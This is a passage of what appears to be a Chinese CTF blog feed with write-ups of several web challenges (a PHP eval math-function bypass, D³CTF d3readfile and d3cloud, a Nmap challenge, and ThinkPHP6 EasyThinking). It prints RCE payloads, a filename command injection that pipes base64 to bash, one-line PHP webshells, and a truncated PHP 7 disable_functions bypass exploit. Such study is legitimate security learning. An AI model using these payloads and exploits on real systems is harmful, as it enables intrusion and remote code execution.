class="keyword">if</span>(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    //例子 c=<span class="number">20</span>-<span class="number">1</span></span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;<span class="string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span></span><br><span class="line"><span class="string">    foreach ($blacklist as $blackitem) &#123;</span></span><br><span class="line"><span class="string">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line"><span class="string">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span></span><br><span class="line"><span class="string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span></span><br><span class="line"><span class="string">    foreach ($used_funcs[0] as $func) &#123;</span></span><br><span class="line"><span class="string">        if (!in_array($func, $whitelist)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //帮你算出答案</span></span><br><span class="line"><span class="string">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>利用进制转换函数</p><p>payload:<code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi=system&amp;cos=cat /flag</code></p><p>分析：</p><p><code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))</code>这一步是构造出_GET</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033094045-2aedb2fb-1341-4c26-8fe7-a9cae55fc613.png" alt="img"></p><p>这里用36进制原因是包含数字字母多可以构造函数名很方便</p><p>选择hex2bin这个函数是因为这个函数可以将16进制字符串转化为2进制字符串，这里可以这么理解我们常见到的字符串就是2进制的字符串（不严谨），这里面起了一个相当于将16进制转化为字符串的作用</p><p>大概如图这样的作用</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033601976-34ae25d6-fd29-4fbb-a6b9-b8fb1a80feae.png" alt="img"></p><p>拆解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$pi=_GET</span><br><span class="line">$_GET[pi]($_GET[cos])</span><br><span class="line">pi=system cos=cat /flag</span><br><span class="line">system(cat /flag)</span><br></pre></td></tr></table></figure><p>注意这里<code>$pi</code>和<code>pi</code>是两个不同的概念，一开始搞混了，至于这里为什么选择<code>pi</code>和<code>cos</code>作为参数名是因为这两个函数名占位最少，因为限制我们长度必须在80以内</p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>利用getallheaders()函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033809691-3f418625-2ff3-430c-a2a0-10762f2fc4eb.png" alt="img"></p><p>返回一个数组</p><p>paylaod:<code>?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></p><p>相当于构造<code>exec(getallheaders()&#123;1&#125;)</code></p><p>因为返回一个数组所以原来应该为<code>getallheaders()[1]</code>因为<code>[]</code>被屏蔽了,所以用<code>&#123;&#125;</code>bypass</p><p>然后1为键名 所以在请求头增加一个<code>1: cat/flag</code>即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683034156126-623b55ac-0e55-40d8-a6bf-ff0e7c9e516c.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> RCE奇淫方式 </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntCTF x D³CTF简单复现</title>
      <link href="/post/e2c24be6.html"/>
      <url>/post/e2c24be6.html</url>
      
        <content type="html"><![CDATA[<p>菜鸡的自我羞辱</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有稍微看了下这个比赛，一眼就不属于我这个水平人做的，稍稍看了一道披着web皮的misc，感觉稍微有点思路，赛后看看大佬们的wp，给自己涨涨见识。</p><h1 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h1><h2 id="d3readfile-Misc"><a href="#d3readfile-Misc" class="headerlink" title="d3readfile(Misc)"></a>d3readfile(Misc)</h2><p>老套路先读读<code>/etc/passwd</code>可以读到</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954270870-621e1a29-e228-4eb2-9d64-1c21454e7eea.png" alt="img"></p><p>再看看环境变量</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954383884-d90e322b-4fe6-46b6-a14f-825692562e07.png" alt="img"></p><p>发现hint 解码发现提示</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954420464-5d98a90e-1a74-42b6-ae64-c64de031e97d.png" alt="img"></p><p>提示关键字是locate</p><p>看了大佬的wp：locate 命令是查询文件所在位置的，会在本地缓存数据库，文件名为:locate.db,不同版本似乎缓存的目录并不一样</p><p>问问chatgpt</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954548792-8766f875-f44c-4f32-aafe-9e7f50cbafac.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682996671795-81e5f146-61a1-4df9-8a4c-2a24db39b17c.png" alt="img"></p><p>不同的linux系统位置不同</p><ul><li>Ubuntu &#x2F; Debian：&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db</li><li>CentOS &#x2F; Fedora &#x2F; RHEL：&#x2F;var&#x2F;lib&#x2F;locatedb</li><li>Arch Linux：&#x2F;var&#x2F;lib&#x2F;pacman&#x2F;local&#x2F;mlocate*&#x2F;mtree</li><li>Gentoo: &#x2F;var&#x2F;cache&#x2F;edb&#x2F;locate.database</li><li>Slackware: &#x2F;var&#x2F;lib&#x2F;slocate&#x2F;slocate.db</li><li>FreeBSD: &#x2F;var&#x2F;db&#x2F;locate.database</li><li>OpenSUSE：&#x2F;var&#x2F;lib&#x2F;slocate&#x2F;slocate.db</li><li>Mageia：&#x2F;var&#x2F;lib&#x2F;mageia&#x2F;mlocate.db</li><li>Oracle Linux：&#x2F;var&#x2F;cache&#x2F;locate&#x2F;locatedb</li></ul><p>最后发现是 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle Linux：/var/cache/locate/locatedb</span><br></pre></td></tr></table></figure><p>发现flag路径：<code>opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954629044-6d77fc45-bf46-4e85-924e-9d2fe577e2ca.png" alt="img"></p><p>Get it!</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954670000-70aae100-4ab6-45ae-8e9f-984d320f1abc.png" alt="img"></p><h2 id="d3cloud-Web"><a href="#d3cloud-Web" class="headerlink" title="d3cloud(Web)"></a>d3cloud(Web)</h2><p>这题看大佬WP是unzip处命令注入</p><p>界面ui什么用都没有 直接进admin后台 <code>/admin</code></p><p>要登陆 <code>admin/admin</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683001433174-c5787435-e598-4d31-a52b-a50681371de4.png" alt="img"></p><p>发现一个php文件</p><p>这里看wp是与官方文档相比多了点代码，那么做这道题还需要现场搭环境和代码审计qwq tql</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> putFileAs($path, $<span class="keyword">file</span>, $name, $options = [])</span><br><span class="line">    &#123;</span><br><span class="line">        $supported_file = array(&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;,&#x27;ico&#x27;,&#x27;zip&#x27;,&#x27;mp4&#x27;,&#x27;mp3&#x27;,&#x27;mkv&#x27;,&#x27;avi&#x27;,&#x27;txt&#x27;);</span><br><span class="line">        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_type, $supported_file)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = fopen($<span class="keyword">file</span>-&gt;getRealPath(), &#x27;r+&#x27;);</span><br><span class="line">        $result = $this-&gt;put(</span><br><span class="line">            $path = trim($path.&#x27;/&#x27;.$name, &#x27;/&#x27;), $stream, $options</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (is_resource($stream)) &#123;</span><br><span class="line">            fclose($stream);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">file</span>-&gt;getClientOriginalExtension() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">            $fs = popen(<span class="string">&quot;unzip -oq &quot;</span>. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .<span class="string">&quot; -d &quot;</span> . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line">            pclose($fs);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result ? $path : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>是这里存在命令注入</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">file</span>-&gt;getClientOriginalExtension() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">            $fs = popen(<span class="string">&quot;unzip -oq &quot;</span>. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .<span class="string">&quot; -d &quot;</span> . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line">            pclose($fs);</span><br></pre></td></tr></table></figure><p>看大佬分析unzip命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/</span><br></pre></td></tr></table></figure><p>然后利用zip文件名写shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo bHMgLz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvbHMudHh0|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>简单解释一下 将<code>ls /</code>结果重定向到<code>/var/www/html/public/ls.txt</code>文件中</p><p>这里必须有换行符 不然写不进入 估计是代码审计中文件名处有转义或者别的操作 通过换行绕过</p><p>还有一个疑问就是写入文件的路径是怎么获取的？是自己搭环境弄到的吗qwq</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002231725-7a1fab4c-f29d-4a0f-be37-d474d8df51bd.png" alt="img"></p><p>直接访问ls.txt</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002436158-744f4590-d747-41ff-baa0-d4b3593bead9.png" alt="img"></p><p>继续和上面一样的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo Y2F0IC9mbDFBZz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvZmxhZy50eHQ=|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002482821-010b80b2-9d7c-4f50-a51b-411008a3ac3b.png" alt="img"></p><h3 id="小总结一下："><a href="#小总结一下：" class="headerlink" title="小总结一下："></a>小总结一下：</h3><p>很多难题还是需要获取到相关版本后，需要自己本地搭建去调试，才能慢慢发现漏洞</p><p>代码审计能力很重要qwq</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>其他的wp都看不懂 还是慢慢来吧</p><p>看了一下这种真正难的ctf 大大的寄写在我脸上 </p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-52-[网鼎杯 2020 朱雀组]Nmap</title>
      <link href="/post/c93f1585.html"/>
      <url>/post/c93f1585.html</url>
      
        <content type="html"><![CDATA[<p>[网鼎杯 2020 朱雀组]Nmap</p><span id="more"></span><p>看题目是一道关于nmap的题目</p><p>试试127.0.0.1</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png" alt="img"></p><p>再来试试我本地kali的nmap</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png" alt="img"></p><p>几乎是一样的 估计就只是放了个接口</p><p> nmap 命令可以将扫描结果保存在文件里面 </p><p>就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护  与之前做的有道题目很相似</p><p>可以用空格与单引号绕过</p><p>选项：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png" alt="img"></p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?= @eval($_POST[1]);?&gt; -oG a.phtml &#x27;</span><br></pre></td></tr></table></figure><p>之后rce就行了</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
            <tag> esc***函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-96-[GYCTF2020]EasyThinking</title>
      <link href="/post/db3afe26.html"/>
      <url>/post/db3afe26.html</url>
      
        <content type="html"><![CDATA[<p>[GYCTF2020]EasyThinking</p><span id="more"></span><p>看标题是一个关于thinkphp的漏洞</p><p>先随便乱输，发现是thinkphp6</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050340127-2a4df26d-b7ea-4d7b-8d00-1b8d918cdfa7.png" alt="img"></p><p>上网查一下漏洞，发现存在一个任意文件创建漏洞 （参考：<a href="https://www.anquanke.com/post/id/257485#h3-3%EF%BC%89">https://www.anquanke.com/post/id/257485#h3-3）</a></p><p>先注册一个账号 然后登录抓包 修改phpsessid这里</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050525889-201d9ede-14f7-40f0-838c-a802991c0e86.png" alt="img"></p><p>这里可以随便输入，然后会在<code>/runtime/session/sess_刚刚输入的32字符</code>生成一个文件 </p><p>这里之后我们要进行命令执行，所以最好将字符串设为带有php后缀的文件</p><p>然后在搜索这里上传我们的一句话木马</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050675837-fd4031ba-50f3-45b9-a53e-bc98875871ee.png" alt="img"></p><p>蚁剑连接 <code>http://7f188c29-b095-4cdc-8aad-37aa4b61403f.node4.buuoj.cn:81/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php</code></p><p>getshell之后发现读不了flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050780538-11589c45-5e9d-4046-a790-d8377818edb7.png" alt="img"></p><p>查看phpinfo()之后发现禁用了很多函数，做到这里和之前buu有道题目很像，有两种做法</p><h2 id="第一种解法-蚁剑插件"><a href="#第一种解法-蚁剑插件" class="headerlink" title="第一种解法 蚁剑插件"></a>第一种解法 蚁剑插件</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051090942-b7882cf9-e5b3-44fe-b624-0506cf666fd1.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051116541-e04d75d7-5362-4bf1-8644-0e3123f7ce13.png" alt="img"></p><h2 id="第二种解法-上传一个绕过disable-functions的脚本"><a href="#第二种解法-上传一个绕过disable-functions的脚本" class="headerlink" title="第二种解法  上传一个绕过disable_functions的脚本"></a>第二种解法  上传一个绕过disable_functions的脚本</h2><p>exp：7.3的版本 这里要注意php版本 不同版本对应的脚本不同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span 